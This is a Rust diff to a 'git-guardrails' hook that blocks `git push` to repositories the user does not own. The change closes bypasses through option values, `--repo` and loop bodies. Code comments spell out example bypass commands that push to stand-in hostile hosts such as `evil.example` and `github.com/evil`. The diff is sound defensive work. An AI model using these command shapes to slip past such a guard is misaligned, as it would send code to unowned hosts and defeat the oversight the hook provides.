@@ -109,16 +109,25 @@ enum PushTarget {
 /// parser `check_owner` uses — so we never classify a token the owner check
 /// can't parse, and never miss a form it can (e.g. the user-less SCP form
 /// `host:owner/repo.git`, which git accepts as a remote).
-fn extract_push_target(command: &str, work_dir: &str) -> PushTarget {
+/// Classify every destination a `git push` names.
+///
+/// Returns one [`PushTarget`] per explicitly-named destination — the positional
+/// and `--repo`'s value are reported separately so the caller validates both.
+/// git prefers the positional, but validating only it is what regressed the
+/// first cut of this fix: an unmodelled option's value posed as a positional and
+/// discarded a recorded evil `--repo` URL that `main` had caught.
+///
+/// An empty result means no explicit destination — the tracking-remote fallback.
+fn extract_push_targets(command: &str, work_dir: &str) -> Vec<PushTarget> {
     let Some(segment) = command
         .split("git push")
         .nth(1)
         .and_then(|s| s.split(&['&', ';', '|'][..]).next())
     else {
-        return PushTarget::None;
+        return Vec::new();
     };
 
-    // Resolve the repository through git's own option grammar. Taking the first
+    // Resolve destinations through git's own option grammar. Taking the first
     // token not starting with `-` made any option's VALUE the candidate target,
     // so the real URL was never ownership-validated: `git push -qo topic=x
     // https://github.com/evil/x.git main` judged `topic=x`, found it neither a
@@ -126,11 +135,19 @@ fn extract_push_target(command: &str, work_dir: &str) -> PushTarget {
     // (cadence-hooks#550). The grammar is shared with
     // `loop_analysis::extract_push_remote` so the two cannot drift apart again.
     let words: Vec<String> = segment.split_whitespace().map(String::from).collect();
-    let Some(candidate) = cadence_hooks_core::shell::push_repository_argument(&words) else {
-        return PushTarget::None;
-    };
-    let candidate = candidate.as_str();
+    let found = cadence_hooks_core::shell::push_repository_argument(&words);
 
+    [found.positional, found.repo_flag]
+        .into_iter()
+        .flatten()
+        .map(|candidate| classify_push_target(&candidate, work_dir))
+        .filter(|t| !matches!(t, PushTarget::None))
+        .collect()
+}
+
+/// Classify a single destination token as a known remote, an explicit URL, or
+/// neither (a refspec or a typo, which falls back to the tracking remote).
+fn classify_push_target(candidate: &str, work_dir: &str) -> PushTarget {
     // A configured remote name routes through git's resolution (unchanged).
     // A timed-out remote listing (#271) would silently reclassify a named
     // remote as "no target", shifting *which* remote gets ownership-validated
@@ -157,6 +174,50 @@ fn extract_push_target(command: &str, work_dir: &str) -> PushTarget {
 
     // Refspec or typo — fall back to the tracking remote (unchanged behavior).
     PushTarget::None
+}
+
+/// Compose the "push target is not yours" block message.
+///
+/// Shared by the explicit-destination loop and the resolved-remote arm so the
+/// two cannot drift into different wording — the same reason the option grammar
+/// itself was collapsed into one function (cadence-hooks#550).
+fn unowned_message(
+    url: &str,
+    work_dir: &str,
+    allowed_owners: &[AllowEntry],
+    allowed_repos: &[AllowEntry],
+    extra_hosts: &[String],
+) -> String {
+    let all_entries: Vec<String> = allowed_owners
+        .iter()
+        .chain(allowed_repos.iter())
+        .map(|e| e.to_string())
+        .collect();
+
+    // If the URL host isn't the default and isn't in extra_hosts, the user
+    // likely tripped over host-scoping. Suggest the qualified forms before the
+    // generic "fix tracking" advice.
+    let url_host = host_and_repo_from_url(url).map(|(h, _)| h);
+    let default = config::default_host();
+    let host_hint = url_host
+        .as_deref()
+        .filter(|h| *h != default && !extra_hosts.iter().any(|e| e == h))
+        .map(|h| {
+            format!(
+                "\n   Host scope:    bare entries match `{default}` only — for `{h}`, qualify them (`{h}/<owner>`) or set `CADENCE_EXTRA_HOSTS={h}`"
+            )
+        })
+        .unwrap_or_default();
+
+    format!(
+        "🚫 git-guardrails: Push target is not yours\n   \
+         Would push to: {url}\n   \
+         Directory:     {work_dir}\n   \
+         Allowed:       {}{host_hint}\n\n   \
+         Fix tracking:  git branch -u origin/main\n   \
+         Push explicit: git push origin main",
+        all_entries.join(" ")
+    )
 }
 
 /// Validates `git push` targets against an allowed owner list.
@@ -292,6 +353,28 @@ impl Check for PushRemoteGuard {
                 let Some(remote) = &cmd.explicit_repo else {
                     continue;
                 };
+
+                // An explicit URL is validated DIRECTLY, never looked up as a
+                // remote name. `git remote get-url --push <url>` always fails,
+                // and the `Failed` arm below fails open by design (its rationale
+                // was written for a typo'd remote *name*) — so a URL in a loop
+                // body reached no ownership check at all:
+                // `for b in a b; do git push https://evil.example/x.git $b; done`
+                // was skipped silently. Answered without a subprocess, which
+                // matters because this loop is the command-controlled spawn path
+                // the shared #271 deadline has to survive.
+                if host_and_repo_from_url(remote).is_some() {
+                    if !check_owner(remote, &allowed_owners, &allowed_repos, &extra_hosts) {
+                        return CheckResult::block(format!(
+                            "🚫 git-guardrails: Push loop targets a remote you don't own\n   \
+                             Found: {remote}\n   \
+                             Fix: push to an owned remote instead, or run each push \
+                             individually"
+                        ));
+                    }
+                    continue;
+                }
+
                 match resolve_push_url(&work_dir_loop, Some(remote)) {
                     PushUrlResolution::Url(url) => {
                         if !check_owner(&url, &allowed_owners, &allowed_repos, &extra_hosts) {
@@ -351,15 +434,41 @@ impl Check for PushRemoteGuard {
         // closing the bypass where a URL silently fell back to validating
         // `origin`. A named remote or bare push resolves through git's
         // tracking remote, exactly as before.
-        let target = extract_push_target(command, &work_dir);
-        let url = if let PushTarget::Url(url) = target {
-            url
-        } else {
-            let explicit = if let PushTarget::Named(ref remote) = target {
-                Some(remote.as_str())
-            } else {
-                None
-            };
+        let targets = extract_push_targets(command, &work_dir);
+
+        // Validate EVERY explicitly-named destination. git prefers the
+        // positional over `--repo`, but checking only git's preferred one is
+        // what regressed the first cut of this fix — an unmodelled option's
+        // value posed as a positional and discarded a recorded evil `--repo`
+        // URL. Blocking if *either* is unowned is stricter than git's own
+        // precedence and costs only a nonsense command.
+        let mut named_remote: Option<String> = None;
+        for target in &targets {
+            match target {
+                PushTarget::Url(url) => {
+                    if !check_owner(url, &allowed_owners, &allowed_repos, &extra_hosts) {
+                        return CheckResult::block(unowned_message(
+                            url,
+                            &work_dir,
+                            &allowed_owners,
+                            &allowed_repos,
+                            &extra_hosts,
+                        ));
+                    }
+                }
+                PushTarget::Named(remote) => named_remote = Some(remote.clone()),
+                PushTarget::None => {}
+            }
+        }
+
+        // Every explicit destination was an owned URL and none needs git
+        // resolution — nothing left to check.
+        if named_remote.is_none() && !targets.is_empty() {
+            return CheckResult::allow();
+        }
+
+        let url = {
+            let explicit = named_remote.as_deref();
             match resolve_push_url(&work_dir, explicit) {
                 PushUrlResolution::Url(url) => url,
                 // The probe hit the #271 subprocess deadline: the guard's own
@@ -381,35 +490,12 @@ impl Check for PushRemoteGuard {
         };
 
         if !check_owner(&url, &allowed_owners, &allowed_repos, &extra_hosts) {
-            let all_entries: Vec<String> = allowed_owners
-                .iter()
-                .chain(allowed_repos.iter())
-                .map(|e| e.to_string())
-                .collect();
-
-            // If the URL host isn't the default and isn't in extra_hosts, the
-            // user likely tripped over host-scoping. Suggest the qualified
-            // forms before the generic "fix tracking" advice.
-            let url_host = host_and_repo_from_url(&url).map(|(h, _)| h);
-            let default = config::default_host();
-            let host_hint = url_host
-                .as_deref()
-                .filter(|h| *h != default && !extra_hosts.iter().any(|e| e == h))
-                .map(|h| {
-                    format!(
-                        "\n   Host scope:    bare entries match `{default}` only — for `{h}`, qualify them (`{h}/<owner>`) or set `CADENCE_EXTRA_HOSTS={h}`"
-                    )
-                })
-                .unwrap_or_default();
-
-            return CheckResult::block(format!(
-                "🚫 git-guardrails: Push target is not yours\n   \
-                 Would push to: {url}\n   \
-                 Directory:     {work_dir}\n   \
-                 Allowed:       {}{host_hint}\n\n   \
-                 Fix tracking:  git branch -u origin/main\n   \
-                 Push explicit: git push origin main",
-                all_entries.join(" ")
+            return CheckResult::block(unowned_message(
+                &url,
+                &work_dir,
+                &allowed_owners,
+                &allowed_repos,
+                &extra_hosts,
             ));
         }
 
@@ -765,6 +851,14 @@ mod tests {
     // (`git remote`) sees a real repo with an `origin` remote.
 
     const REPO_DIR: &str = env!("CARGO_MANIFEST_DIR");
+
+    /// The first classified destination, or `None` when there is no explicit one.
+    fn extract_push_target(command: &str, work_dir: &str) -> PushTarget {
+        extract_push_targets(command, work_dir)
+            .into_iter()
+            .next()
+            .unwrap_or(PushTarget::None)
+    }
 
     #[test]
     fn extract_push_target_named_for_known_remote() {
